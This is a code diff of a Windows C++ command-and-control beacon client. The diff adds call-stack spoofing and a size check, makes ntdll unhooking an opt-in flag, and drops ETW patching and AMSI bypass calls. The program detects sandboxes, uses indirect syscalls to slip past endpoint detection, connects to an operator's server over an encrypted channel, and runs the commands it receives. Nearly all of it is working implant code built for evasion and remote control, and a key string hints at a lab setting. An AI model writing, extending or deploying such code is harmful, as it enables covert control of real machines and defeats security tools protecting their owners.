@@ -5,11 +5,12 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <tlhelp32.h>
-#include <iostream>
+#include <cstdio>
 #include <string>
 #include <cstring>
 #include <cstdlib>
 #include "syscalls.h"
+#include "spoof.h"
 #include "crypto.h"
 #include "http.h"
 #include "evasion.h"
@@ -107,29 +108,35 @@ static std::string exec_native(const std::string& cmd, bool& handled) {
 
 int main(int argc, char* argv[]) {
     if (argc < 3) {
-        std::cerr << "usage: client <server-ip> <port>\n";
+        fprintf(stderr, "usage: client <server-ip> <port>\n");
         return 1;
     }
 
     srand((unsigned)GetTickCount());
 
     if (ev::is_sandbox()) {
-        std::cerr << "[beacon] sandbox environment detected, exiting\n";
+        fprintf(stderr, "[beacon] sandbox environment detected, exiting\n");
         return 1;
     }
 
     if (!sc::init()) {
-        std::cerr << "[beacon] failed to init indirect syscalls\n";
+        fprintf(stderr, "[beacon] failed to init indirect syscalls\n");
         return 1;
     }
+    fprintf(stdout, "[beacon] CET-compliant stack spoofing armed (shadow stack: %s)\n",
+            spoof::cet_shadow_stack_enabled() ? "enforced" : "not enforced");
 
+    // Unhook is OPT-IN: restoring hook bytes trips self-checks on EDRs that
+    // verify their own hooks. By default nothing is ever written to ntdll -
+    // the syscall layer resolves SSNs from a pristine KnownDlls copy instead.
+    // #define ENABLE_NTDLL_UNHOOK 1
+#ifdef ENABLE_NTDLL_UNHOOK
     ev::unhook_ntdll();
-    ev::patch_etw();
-    ev::bypass_amsi();
+#endif
 
     std::string key = XS("s3cr3t-lab-key-2026").get();
     if (!crypto_init(key.c_str())) {
-        std::cerr << "[beacon] crypto init failed\n";
+        fprintf(stderr, "[beacon] crypto init failed\n");
         return 1;
     }
 
@@ -138,7 +145,7 @@ int main(int argc, char* argv[]) {
     LONG st = sc::NtAllocateVirtualMemory(GetCurrentProcess(), &stage, 0, &buf_size,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (st != 0 || !stage) {
-        std::cerr << "[beacon] NtAllocateVirtualMemory failed: 0x" << std::hex << st << "\n";
+        fprintf(stderr, "[beacon] NtAllocateVirtualMemory failed: 0x%lX\n", (unsigned long)st);
         return 1;
     }
 
@@ -152,16 +159,16 @@ int main(int argc, char* argv[]) {
     addr.sin_port = htons((u_short)atoi(argv[2]));
 
     if (connect(s, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
-        std::cerr << "[beacon] connect failed: " << WSAGetLastError() << "\n";
+        fprintf(stderr, "[beacon] connect failed: %d\n", WSAGetLastError());
         return 1;
     }
 
     SecureChannel tls;
     if (!tls.client_handshake(s)) {
-        std::cerr << "[beacon] secure handshake failed\n";
+        fprintf(stderr, "[beacon] secure handshake failed\n");
         return 1;
     }
-    std::cout << "[beacon] connected to " << argv[1] << ":" << argv[2] << " (ECDH-P256 + AES-GCM)\n";
+    fprintf(stdout, "[beacon] connected to %s:%s (ECDH-P256 + AES-GCM)\n", argv[1], argv[2]);
 
     while (true) {
         std::string req;
@@ -169,16 +176,23 @@ int main(int argc, char* argv[]) {
 
         std::string cmd;
         if (!crypto_decrypt(req, cmd)) {
-            std::cout << "[beacon] decrypt failed\n";
+            fprintf(stdout, "[beacon] decrypt failed\n");
             continue;
         }
-        memcpy(stage, cmd.data(), cmd.size());
-        ((char*)stage)[cmd.size()] = 0;
-
         if (cmd == "exit" || cmd == "quit") {
             http_send_response(tls, "");
             break;
         }
+
+        if (cmd.size() + 1 > buf_size) {
+            std::string out = "[error] command too large\n";
+            std::string enc;
+            if (!crypto_encrypt(out, enc) || !http_send_response(tls, enc)) break;
+            continue;
+        }
+
+        memcpy(stage, cmd.data(), cmd.size());
+        ((char*)stage)[cmd.size()] = 0;
 
         bool handled = false;
         std::string out = exec_native(cmd, handled);
